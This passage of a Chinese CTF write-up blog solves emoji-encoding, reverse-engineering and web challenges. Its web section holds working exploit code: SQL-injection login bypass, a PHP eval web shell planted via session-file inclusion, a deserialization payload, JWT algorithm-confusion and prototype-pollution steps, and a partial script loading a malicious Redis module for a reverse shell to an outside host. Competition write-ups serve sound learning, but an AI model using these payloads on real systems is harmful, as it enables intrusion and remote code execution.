class="string">:helicopter:</span></span><br><span class="line"><span class="string">:steam_locomotive:</span></span><br><span class="line"><span class="string">:tram:</span></span><br><span class="line"><span class="string">:mountain_railway:</span></span><br><span class="line"><span class="string">:bike:</span></span><br><span class="line"><span class="string">:aerial_tramway:</span></span><br><span class="line"><span class="string">:suspension_railway:</span></span><br><span class="line"><span class="string">:mountain_cableway:</span></span><br><span class="line"><span class="string">:tractor:</span></span><br><span class="line"><span class="string">:blue_car:</span></span><br><span class="line"><span class="string">:oncoming_automobile:</span></span><br><span class="line"><span class="string">:car:</span></span><br><span class="line"><span class="string">:red_car:</span></span><br><span class="line"><span class="string">:taxi:</span></span><br><span class="line"><span class="string">:oncoming_taxi:</span></span><br><span class="line"><span class="string">:articulated_lorry:</span></span><br><span class="line"><span class="string">:bus:</span></span><br><span class="line"><span class="string">:oncoming_bus:</span></span><br><span class="line"><span class="string">:rotating_light:</span></span><br><span class="line"><span class="string">:police_car:</span></span><br><span class="line"><span class="string">:oncoming_police_car:</span></span><br><span class="line"><span class="string">:fire_engine:</span></span><br><span class="line"><span class="string">:ambulance:</span></span><br><span class="line"><span class="string">:minibus:</span></span><br><span class="line"><span class="string">:truck:</span></span><br><span class="line"><span class="string">:train:</span></span><br><span class="line"><span class="string">:station:</span></span><br><span class="line"><span class="string">:train2:</span></span><br><span class="line"><span class="string">:bullettrain_front:</span></span><br><span class="line"><span class="string">:bullettrain_side:</span></span><br><span class="line"><span class="string">:light_rail:</span></span><br><span class="line"><span class="string">:monorail:</span></span><br><span class="line"><span class="string">:railway_car:</span></span><br><span class="line"><span class="string">:trolleybus:</span></span><br><span class="line"><span class="string">:ticket:</span></span><br><span class="line"><span class="string">:fuelpump:</span></span><br><span class="line"><span class="string">:vertical_traffic_light:</span></span><br><span class="line"><span class="string">:traffic_light:</span></span><br><span class="line"><span class="string">:warning:</span></span><br><span class="line"><span class="string">:construction:</span></span><br><span class="line"><span class="string">:beginner:</span></span><br><span class="line"><span class="string">:atm:</span></span><br><span class="line"><span class="string">:slot_machine:</span></span><br><span class="line"><span class="string">:busstop:</span></span><br><span class="line"><span class="string">:barber:</span></span><br><span class="line"><span class="string">:hotsprings:</span></span><br><span class="line"><span class="string">:checkered_flag:</span></span><br><span class="line"><span class="string">:crossed_flags:</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">out = emoji_list.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">out = out[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">final = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    echo = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        emojiSymbol = emoji.emojize(out[random.randint(<span class="number">0</span>, <span class="built_in">len</span>(out) - <span class="number">1</span>)], use_aliases=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;:&#x27;</span> <span class="keyword">in</span> emojiSymbol:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        echo += emojiSymbol</span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="number">26</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    final += <span class="string">&#x27;🔤&#x27;</span> + echo + <span class="string">&#x27;🔤 &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;tmp&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(final.encode())</span><br></pre></td></tr></table></figure>
<h4 id="解题人视角"><a href="#解题人视角" class="headerlink" title="解题人视角"></a>解题人视角</h4><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4br2deatj61ds0astb902.jpg" alt=""></p>
<p>binwalk -e 分离出一个压缩包，里面俩文件，先file一下看看都是啥</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4brvm8d1j60mm03wt9602.jpg" alt=""></p>
<p>都是文本文件，用code打开康康</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4bslwkyjj60g20a4t8t02.jpg" alt=""></p>
<p>hint.txt如上</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4bt5j38aj61nc0c840b02.jpg" alt=""></p>
<p>flag.emojic文件如上，乍一看是emoji编码，发现解不动，搜一下hint</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4bus5qpwj619q0u0jwr02.jpg" alt=""></p>
<p>发现emojicode，是一种编程语言</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4bwhh0blj61gs0u00yx02.jpg" alt=""></p>
<p>这一坨东西翻译成python就是如图所示，就定义了一个列表，😀 是输出，🐽是访问集合中元素，很简单，稍微读读文档就知道咋回事了。</p>
<p>那看我们的源代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">🏁 🍇</span><br><span class="line">  🍿 🔤😼👿🏇🚐👭🏇📫♣😔🐡🎨😼🔅👯🙎💘📇📺💡👮🐉👴📨😁👖📁🔤 🔤⛽♨👹🌅🎥🏇☝📺🗽💰🎯🐛🐓📛🐓🐸🌆💍🍐🌁💪😴🚢🐇😘👘🔤 🔤👝👣👘👞👲👰🐧👬👖👘👩🐪👖👜👤🐧👡🐨👖👤👘👪👫🐪👩👴🔤 🔤😿👂🗾🎲📤🚣📞☎🐰🍳✋🐩⛺💙🛀🎵😾✊👯🔔🍪🔮🌌🌂😉🌻🔤 🔤😳🍔🏡🐮♠📷👷🌷🍋🐃💂👲⌛📌☕🏪🚗🌴👝💶🔮📲😼☂🌍🍢🔤 🔤💜😱⛳🐫📡🚥🍙📔📌🙆🎻🐣➿🎊🐷🍝☎🎻🍒😁😝🏬💶🚥🐼👅🔤 🔤😻🍁🚓💍💨⏳💚🚬🍋🎡🐒👎😹🔐😳👱🐂🍞🙍🎍🎀🍼🎸👅🔕📀🔤 🔤📠♥🐶🔑⌚😟❓🍠♨👜🎹🏀😩👡🍒👶🍠🌚🐩👸🐹📻🍀🛁❔📦🔤 🔤👇🍦🌘👝💷💧📞👦🍑🐂🐞💴😇🎄⏰💶💃🐅🌗❗📣🔰🎆⚽😟📢🔤 🔤😥♠🐕🙌🐇🙊😳🐅⚓🎋🌜♨😵🔇🍬🎥😬🍝📄🏯🍶⚠📏🌽📦🐗🔤 🔤🐷🍦🚍🎆🐺📪🐚🐋🏫👞😥🚌🍭🎌👪💪🎱📆🍛⛵🔖😱🙎🐝🐫🍎🔤 🔤👥📯🍔📝🎉🙇⭐✋🐏❄🚎👩🚁🎲🚀❗☂🍋✂🔏✋👳🍕🍭🚑💎🔤 🔤📕🌺🏡🙆🍌😗👕🏆♣🐊👦😲🏀💑🍫👱📊🌄🐌🍩🍢🏬😴🎴📛🏦🔤 🔤😰👡🎈🐎🔉🍚🔌🎍🔌📣🙋⛳😒🍏🚪🌍👯💰😂❗💗🚤💈📁🐷🔍🔤 🔤🐕🍂🍶🚡🚌😯🐝💃🍐🍅🏥🍬👉🎣👨🎨📤🍛👰🚌🍎🐉🌹📯🚙🔍🔤 🔤🍤🍚😠📕🎓🙊👍🔨🐖👇👓👐🌅💃🎨🎿😺🌁💅⚡📫👚👢🎈🍚🔒🔤 🔤🏯🏊🌁📬🏁🏬👠📲🍁😪💚👶🎫🎄🍌👲📟💫🍓😥😾😂🌾👑🎆🎠🔤 🔤🎑🍰👧👆🍼👡🗻❗🏩📙📄💏🎣🚗📢📕📃☎💍🀄🍁😊🔮👿👜👎🔤 🔤✌🎑🚙🚋🏉🔓😸🔥🐓🍠📎🐩📂📒➿🍙👄🍹🎒😏🐩👥🔋🍰🐸🚲🔤 🔤👲💃💋💧😥🙀♦🚴🐳😉🌱🍎💗😺😿🏇😁👇🏫😄🐕☎😰🚢⛽🌜🔤 🔤👾🗽🎌🎊⛽😪😮📠😢🐜😄😱😝📜🎢🍺🎷🍦👊🌎💂🎐👋🐼🏡🔮🔤 🔤👅🌌⛽🌋🐖🔒🔒🍜🍗🎫🙏🎤🔔☎📊📹🐘📖🐟✨💔👊👻📜🐬🎣🔤 🔤💘📓🐵💀🎹✊🔌🌼🔋😖🌓💁🍫📝🏃👥⛳🙀🎉🐜😌📐👜🙀🎂👄🔤 🔤👡👰🐐💪📐🎏👆😁👧🍥🐓👱🎏😊🚖☺🌓🚢🎈🎋🌽😓🎷🎎🍻⛺🔤 🔤☝💒😃👠👗👇🐆🌆⚠🚔😷🎺🏥🙎🌈👾👏😯🐋🔋💄☕💔🐜😞💪🔤 🔤🌸🐳💡📎🐹😆🍓☀👗🚧🚢🍔🔌😨📷👳💧🐾🐝🔕🐍👪🚒🐸🔮👨🔤 🔤🐺🏇👔🍀🌛🏡🐱🚉😣♠👞🚂🙋☎🚅🌈🌋📆🍙🙉👨🍲📙💎✋🏩🔤 🔤🐓🏃📎🌇🍏🌹☝🎻🐧😪🐃💳💰🍐👇🐟🙇😱📡👝👄📐🔪☁💬⭐🔤 🔤💉🌙☀📭📨👋🌆🚝💘💻😄💩🔋🐟🔈📢👍🌖📌🐲💕🍛❕🍷🏀🐸🔤 🔤🐤👫🚠💨📖🚦🔑📥🔪🏈🚒💌🌴👪😦🙇🌍📘😍😞👲🍸🐙☎🎨😸🔤  🍆 ➡️ list</span><br><span class="line">  💭 😀 🐽list 2❗️❗️</span><br><span class="line">🍉</span><br></pre></td></tr></table></figure>
<p>两个🔤🔤中间跟的是常量，所以这中间的一堆emoji就是字符串，然后后面访问了list[2]这个元素，可以下载emojicode然后编译跑一遍，但是没有输出，因为多了一个💭</p>
<p><a target="_blank" rel="noopener" href="https://www.emojicode.org/docs/reference/basics.html">https://www.emojicode.org/docs/reference/basics.html</a></p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4c1th4pnj61n30u0q7v02.jpg" alt=""></p>
<p>其实就是个注释，去掉即可</p>
<p>本质就是访问列表中的2号元素，拿出来是这个东西👝👣👘👞👲👰🐧👬👖👘👩🐪👖👜👤🐧👡🐨👖👤👘👪👫🐪👩👴</p>
<p>emoji decode解一下获得flag 网址：<a target="_blank" rel="noopener" href="http://www.atoolbox.net/Tool.php?Id=937">http://www.atoolbox.net/Tool.php?Id=937</a></p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4c3e2luej61d80u0wgn02.jpg" alt=""></p>
<p>当然也可以去掉注释，然后编译一下，然后再去emoji解码</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4c5do0z5j60le08sgn202.jpg" alt=""></p>
<p>flag{y0u_ar3_em0j1_mast3r}</p>
<h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="dragon"><a href="#dragon" class="headerlink" title="dragon"></a>dragon</h3><p>flag{l3m0n_l0v3_bas364}</p>
<p>最基本的base64代码，不过换了个表，解码就好</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">table = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/&quot;</span></span><br><span class="line">old_table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line">flag1 = <span class="string">&quot;zMXHz3TSm20WBL9SmhyZx2jHCZm2nh0=&quot;</span></span><br><span class="line"></span><br><span class="line">flag = base64.b64decode(flag1.translate(<span class="built_in">str</span>.maketrans(table,old_table)))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv5f6t4phxj60ry0cwdhj02.jpg" alt=""></p>
<h3 id="equation"><a href="#equation" class="headerlink" title="equation"></a>equation</h3><p>2020羊城杯原题，只不过去掉了pyc反编译的过程，原题链接：<a target="_blank" rel="noopener" href="https://la13x.github.io/2021/04/16/buuctf-reverse1/#1-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-login">https://la13x.github.io/2021/04/16/buuctf-reverse1/#1-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-login</a></p>
<p>flag{58964088b637e50d3a22b9510c1d1ef8}</p>
<h3 id="flattening"><a href="#flattening" class="headerlink" title="flattening"></a>flattening</h3><h4 id="出题人视角-1"><a href="#出题人视角-1" class="headerlink" title="出题人视角"></a>出题人视角</h4><p>WDNMD 真难编译，出这个题让👴🏻知道了编译不是靠人品</p>
<p><img src="/Users/lemon/Library/Application%20Support/typora-user-images/image-20211005213507923.png" alt=""></p>
<p>gcc和g++要切到8.x版本才行，然后要改个啥文件来着char改为uint_8好像是，不管了，反正👴🏻编好了，总之就是很水的一个题，知道混淆技术了那就是白给题，反正👴🏻是👣本小子，👴🏻只会用工具去混淆，👴🏻还有很多东西要学</p>
<h4 id="解题人视角-1"><a href="#解题人视角-1" class="headerlink" title="解题人视角"></a>解题人视角</h4><p>ida走一波</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4rpaar0aj314f0u0tap.jpg" alt=""></p>
<p>WDNMD，意识到并不简单，看看CFG</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4rpr6j8mj618d0u0go702.jpg" alt=""></p>
<p>血压上来了，但是问题不大，控制流平坦化，参见这个：<a target="_blank" rel="noopener" href="https://la13x.github.io/2021/04/18/hardCpp/">https://la13x.github.io/2021/04/18/hardCpp/</a></p>
<p>用deflat一把梭，先找找入口地址</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4rox99y0j30cs05umxr.jpg" alt=""></p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4rom2dzkj313c0asjug.jpg" alt=""></p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4rsecpypj30k40qwjs6.jpg" alt=""></p>
<p>舒服了</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4rsv20vlj315o0iwacm.jpg" alt=""></p>
<p>什么白给签到题😅</p>
<p>直接在data段找到key每个值异或0x37就出了</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4s3b74hkj614c0u0tan02.jpg" alt=""></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> key[] =</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="number">116</span>,</span><br><span class="line">    <span class="number">7</span>,</span><br><span class="line">    <span class="number">89</span>,</span><br><span class="line">    <span class="number">67</span>,</span><br><span class="line">    <span class="number">69</span>,</span><br><span class="line">    <span class="number">7</span>,</span><br><span class="line">    <span class="number">123</span>,</span><br><span class="line">    <span class="number">104</span>,</span><br><span class="line">    <span class="number">81</span>,</span><br><span class="line">    <span class="number">6</span>,</span><br><span class="line">    <span class="number">7</span>,</span><br><span class="line">    <span class="number">64</span>,</span><br><span class="line">    <span class="number">104</span>,</span><br><span class="line">    <span class="number">81</span>,</span><br><span class="line">    <span class="number">6</span>,</span><br><span class="line">    <span class="number">86</span>,</span><br><span class="line">    <span class="number">67</span>,</span><br><span class="line">    <span class="number">67</span>,</span><br><span class="line">    <span class="number">4</span>,</span><br><span class="line">    <span class="number">89</span>,</span><br><span class="line">    <span class="number">94</span>,</span><br><span class="line">    <span class="number">89</span>,</span><br><span class="line">    <span class="number">80</span>,</span><br><span class="line">    <span class="number">104</span>,</span><br><span class="line">    <span class="number">6</span>,</span><br><span class="line">    <span class="number">68</span>,</span><br><span class="line">    <span class="number">104</span>,</span><br><span class="line">    <span class="number">69</span>,</span><br><span class="line">    <span class="number">4</span>,</span><br><span class="line">    <span class="number">86</span>,</span><br><span class="line">    <span class="number">6</span>,</span><br><span class="line">    <span class="number">6</span>,</span><br><span class="line">    <span class="number">78</span>,</span><br><span class="line">    <span class="number">104</span>,</span><br><span class="line">    <span class="number">6</span>,</span><br><span class="line">    <span class="number">89</span>,</span><br><span class="line">    <span class="number">67</span>,</span><br><span class="line">    <span class="number">4</span>,</span><br><span class="line">    <span class="number">69</span>,</span><br><span class="line">    <span class="number">4</span>,</span><br><span class="line">    <span class="number">68</span>,</span><br><span class="line">    <span class="number">67</span>,</span><br><span class="line">    <span class="number">6</span>,</span><br><span class="line">    <span class="number">89</span>,</span><br><span class="line">    <span class="number">80</span>,</span><br><span class="line">    <span class="number">55</span></span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(key)/<span class="number">4</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">  	<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, key[i]^<span class="number">0x37</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4s5ucmtgj30ik05owf4.jpg" alt=""></p>
<p>flag{C0ntr0L_f10w_f1att3ning_1s_r3a11y_1nt3r3st1ng}</p>
<h1 id="wp-by-Sparta-EN"><a href="#wp-by-Sparta-EN" class="headerlink" title="wp by Sparta_EN"></a>wp by Sparta_EN</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>根据描述 直接在 CTFd 页面查看源码</p>
<p><img src="https://i.loli.net/2021/10/05/f9hUnSqNLdQjtcZ.png" alt="image.png"></p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Simple-PHP"><a href="#Simple-PHP" class="headerlink" title="Simple PHP"></a>Simple PHP</h3><p><code>www.zip</code> 获取源码 <code>debug_only/infoinfoinfome.php</code> 查看PHPInfo</p>
<p>直接看源码 SQL 没做过滤，使用了 <code>password_hash()</code>对密码取 hash</p>
<p>构造 Payload  <code>username=&#39; UNION SELECT 1337, &#39;testuser&#39;, &#39;$2y$10$CkDlt51VAEIFDp5A8YVft.rzVRjuHhe9YzYI1Cug0nwJzmamvx1EK&#39;, &#39;&#39; -- &amp;password=passw0rd</code> 这里的 hash 即 <code>passw0rd</code>的 hash 根据登陆页面的 hint, id 取 1337 可以通过登入后的 check </p>
<p>登入后发现我们可以更新用户数据，参考源码 我们发现这个应用会把用户数据序列化后写入 SESSION</p>
<p><img src="https://i.loli.net/2021/10/05/3r61PvY8tMGQIdo.png" alt="image.png"></p>
<p>而且 <code>index.php</code>做了一系列的检查，但是没有过滤 session 文件，因此我们可以更新用户任意字段(密码除外)为一句话木马</p>
<p>结合 phpinfo(); 的结果，我们可以找到会话路径为 <code>/var/lib/php/sessions</code></p>
<p>即可进行会话包含。发现 flag 为 <code>/flag-&lt;随机字符&gt;</code>，<code>cat</code>下读出即可。</p>
<p><img src="https://i.loli.net/2021/10/06/sydojEwr7TC2bGc.png" alt="image.png"></p>
<p>附 EXP</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">sess = requests.session()</span><br><span class="line"><span class="comment"># password=test&amp;username=123%27%20UNION%20SELECT%201,%27test%27,%27$2a$12$QBE87yzDmO9BEq1JWZq1eODkoVzbk6mQ0nyU400CB90Vz8SSi9b2m%27,%27%27%20+--+</span></span><br><span class="line">target = <span class="string">&quot;http://152.136.99.28:30166/&quot;</span></span><br><span class="line">session_path = <span class="string">&quot;/var/lib/php/sessions/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># passw0rd</span></span><br><span class="line"><span class="comment"># $2y$10$CkDlt51VAEIFDp5A8YVft.rzVRjuHhe9YzYI1Cug0nwJzmamvx1EK</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;&#x27; UNION SELECT 1337, &#x27;testuser&#x27;, &#x27;$2y$10$CkDlt51VAEIFDp5A8YVft.rzVRjuHhe9YzYI1Cug0nwJzmamvx1EK&#x27;, &#x27;&#x27; -- &quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;passw0rd&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;[+] Trying to auth with sql injection&quot;</span>)</span><br><span class="line"></span><br><span class="line">r = sess.post(<span class="string">f&quot;<span class="subst">&#123;target&#125;</span>/login.php&quot;</span>, data=payload, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">session_id = r.cookies.get(<span class="string">&quot;PHPSESSID&quot;</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">f&#x27;[*] Session ID: <span class="subst">&#123;session_id&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> r.status_code != <span class="number">302</span>:</span><br><span class="line">    print(<span class="string">&quot;[!] Auth failure!&quot;</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;[+] Updating user info with malicious data&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;user&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;passw0rd&quot;</span>,</span><br><span class="line">    <span class="comment"># Where the magic happens</span></span><br><span class="line">    <span class="string">&quot;description&quot;</span>: <span class="string">&quot;&lt;?php eval($_REQUEST[\&quot;cmd\&quot;]); ?&gt;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = sess.post(<span class="string">f&quot;<span class="subst">&#123;target&#125;</span>/index.php?page=me.php&quot;</span>, data=payload)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;[+] Refreshing session...&quot;</span>)</span><br><span class="line"></span><br><span class="line">sess.get(<span class="string">f&quot;<span class="subst">&#123;target&#125;</span>/index.php?page=me.php&quot;</span>)</span><br><span class="line"></span><br><span class="line">params = &#123;</span><br><span class="line">    <span class="string">&quot;cmd&quot;</span>: <span class="string">&quot;echo system(&#x27;cat /flag*&#x27;);&quot;</span>,</span><br><span class="line">    <span class="string">&quot;page&quot;</span>: <span class="string">f&quot;../../../../../../<span class="subst">&#123;session_path&#125;</span>/sess_<span class="subst">&#123;session_id&#125;</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = sess.get(<span class="string">f&quot;<span class="subst">&#123;target&#125;</span>/index.php&quot;</span>, params=params)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;[+] Getting flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">print(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="Expresssssss"><a href="#Expresssssss" class="headerlink" title="Expresssssss"></a>Expresssssss</h3><p>下载附件 虽然看样子是使用了非对称密钥体制实现 JWT，但很明显，算法选错了 </p>
<p><img src="https://i.loli.net/2021/10/06/Hlo7amCxiwuWSdJ.png" alt="image.png"></p>
<p>非对称体制应当使用 <code>RS256</code>而非<code>HS256</code>，是一个很严重的错误配置，我们继续往后看</p>
<p><img src="https://i.loli.net/2021/10/06/h7gMXG5djwOSJae.png" alt="image.png"></p>
<p>serverConfig 在上文是空的，而这里需要serverConfig.isOpen 为 <code>true</code>，再加上上面的源码有对用户输入进行<code>merge</code>操作。</p>
<p><img src="https://i.loli.net/2021/10/06/YWhMjKirytQJfkO.png" alt="image.png"></p>
<p>看一下我们的 cookie 发现 PK 以及发过来了。</p>
<p>我们可以使用这个 PK 通过 <code>HS256</code>自己签发 JWT 进入 <code>/admin</code></p>
<p>这样我们不妨构造原型污染</p>
<p><img src="https://i.loli.net/2021/10/06/shDbwWGMNOR467L.png" alt="image.png"></p>
<p>替换掉cookie</p>
<p><img src="https://i.loli.net/2021/10/06/CzuMFya3OnB9rmd.png" alt="image.png"></p>
<h3 id="Happy-PHP"><a href="#Happy-PHP" class="headerlink" title="Happy PHP"></a>Happy PHP</h3><p><img src="https://i.loli.net/2021/10/06/iucs6BIWmXj38ft.png" alt="image.png"></p>
<p>这里需要构造反序列化</p>
<p>但这里对对应的字段进行了验证，我们无法通过改数量绕过<code>__wakeup()</code>，可以改变对象的大小写来绕过检测。</p>
<p><code>x=O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;a&quot;:2:&#123;s:4:&quot;code&quot;;s:24:&quot;eval($_REQUEST[&quot;code&quot;]);&quot;;&amp;code=echo%20123;</code></p>
<p>可以看到回显</p>
<p><img src="https://i.loli.net/2021/10/06/EpSvrKDTejP2aLw.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2021/10/06/wZlgxsEUASqjuer.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2021/10/06/U3LxMngYrjhEAVa.png" alt="image.png"></p>
<p><code>open_base_dir</code>和<code>disable_functions</code>都给限制死了</p>
<p>看一下当前目录吧</p>
<p><img src="https://i.loli.net/2021/10/06/u97pJGHFmR38lXa.png" alt="image.png"></p>
<p>有个<code>.config.swp.php</code></p>
<p>把文件拖下来，vim 恢复下 得到 mysql 与 redis 凭据，试了下 redis 貌似好使。但貌似没法写文件。</p>
<p><img src="https://i.loli.net/2021/10/06/XifLGMKtxJFP3wy.png" alt="image.png"></p>
<p>我们不妨看看这个 redis 是否能够载入恶意 module。这里使用了 <a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</a></p>
<p>将其写入 <code>/tmp</code>目录，然后登录到 redis 载入 反弹 shell 到服务器</p>
<p>编写 EXP</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># base = O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:4:&quot;code&quot;;s:24:&quot;eval($_REQUEST[&quot;code&quot;]);&quot;;&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;http://152.136.99.28:30108&quot;</span></span><br><span class="line"></span><br><span class="line">redis_rce_mod = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">l_host = <span class="string">&quot;1.1.1.1&quot;</span></span><br><span class="line"></span><br><span class="line">l_port = <span class="string">&quot;1234&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rce</span>(<span class="params">code, additional=<span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&quot;x&quot;</span>: <span class="string">&#x27;O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;a&quot;:2:&#123;s:4:&quot;code&quot;;s:24:&quot;eval($_REQUEST[&quot;code&quot;]);&quot;;&#125;&#125;&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;code&quot;</span>: code,</span><br><span class="line">        <span class="string">&quot;additional&quot;</span>: additional</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(target, data=payload)</span><br><span class="line">    <span class="keyword">if</span> (r.status_code != <span class="number">200</span>):</span><br><span class="line">        <span class="keyword">raise</span> Exception(r.text)</span><br><span class="line">    <span class="keyword">return</span> r.text[<span class="number">132</span>:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;module.so&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    redis_rce_mod = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> rce(<span class="string">&quot;echo &#x27;Sparta_EN&#x27;;&quot;</span>) == <span class="string">&quot;Sparta_EN&quot;</span>:</span><br><span class="line">    print(<span class="string">&quot;[*] RCE confirmed!&quot;</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;[+] Uploading malicious redis module...&quot;</span>)</span><br><span class="line"></span><br><span class="line">rce(<span class="string">&quot;file_put_contents(&#x27;/tmp/module.so&#x27;, base64_decode($_REQUEST[&#x27;additional&#x27;]));&quot;</span>, base64.b64encode(</span><br><span class="line">    redis_rce_mod).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">rce(<span class="string">&quot;chmod(&#x27;/tmp/module.so&#x27;, 0777);&quot;</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;[+] Trying to trick redis load module and get a reverse shell...&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">revershell_payload = <span class="string">f&quot;&quot;&quot;set_time_limit(0);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$socket = socket_create(AF_INET, SOCK_STREAM, 0);</span></span><br><span class="line"><span class="string">socket_connect($socket, &quot;127.0.0.1&quot;, 6379);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$payload1 = 